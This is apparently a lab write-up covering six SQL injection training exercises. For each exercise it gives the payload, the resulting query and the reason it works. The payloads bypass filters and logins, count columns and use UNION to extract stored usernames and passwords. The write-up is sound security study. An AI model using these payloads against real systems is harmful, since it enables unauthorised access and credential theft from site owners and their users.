## Lab 1 — Retrieve hidden data

**Payload:**

```sql
Gifts' OR 1=1-- 
```

**Query produced (conceptually):**

```sql
SELECT *
FROM products
WHERE category = 'Gifts' OR 1=1-- '
AND released = 1;
```

**Why it worked:** The injected `OR 1=1` condition is always true, and `--` comments out the rest of the query, bypassing the `released = 1` filter.

**Result:** Solved — the page displayed more products, including unreleased products.


## Lab 2 — SQL injection login bypass

**Payload:**

```sql
administrator'--
```

**Query produced (conceptually):**

```sql
SELECT * FROM users
WHERE username = 'administrator'-- '
AND password = '<entered password>';
```

**Why it worked:** The injected `--` comments out the remainder of the SQL query, removing the password condition and allowing the administrator account to authenticate.

**Result:** Solved — logged in as administrator.


## Lab 3 — UNION attack: retrieve data from other tables

**Payload:**

```sql
' UNION SELECT username, password FROM users--
```

**Query produced (conceptually):**

```sql
SELECT name, description
FROM products
WHERE category = ''
UNION
SELECT username, password
FROM users-- ';
```

**Why it worked:** The original query returned two columns, so the UNION query could append the two compatible text columns `username` and `password` from the `users` table.

**Result:** Solved — retrieved the administrator's credentials and logged in as administrator.


## Lab 4 — Determine the number of columns

**Payloads tested:**

```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
' ORDER BY 4--
```

**Observation:** `ORDER BY 1`, `ORDER BY 2`, and `ORDER BY 3` worked. `ORDER BY 4` caused an error.

**Query produced (conceptually):**

```sql
SELECT name, description, price
FROM products
WHERE category = 'Gifts'
ORDER BY 4-- ';
```

**Why it worked:** The first three column positions exist, but column 4 is outside the result set, so the database raises an error.

**Result:** Determined that the original query returns 3 columns.


## Lab 5 — Find a column containing text

**Payload:**

```sql
' UNION SELECT NULL,'SsnoMl',NULL--
```

**Query produced (conceptually):**

```sql
SELECT name, description, price
FROM products
WHERE category = ''
UNION SELECT NULL, 'SsnoMl', NULL-- ';
```

**Why it worked:** The second column accepts text, and the payload places the exact requested string `SsnoMl` in that column while using `NULL` for the other two columns.

**Result:** Solved — the database returned the required string.


## Lab 6 — Retrieve multiple values in a single column

**Payload:**

```sql
' UNION SELECT NULL,username || '~' || password FROM users--
```

**Query produced (conceptually):**

```sql
SELECT name, description
FROM products
WHERE category = ''
UNION
SELECT NULL, username || '~' || password
FROM users-- ';
```

**Why it worked:** The concatenation operator `||` combines the username and password into one text value, separated by `~`, allowing both values to be retrieved through one text-compatible column.

**Result:** Solved — retrieved multiple values in a single column.
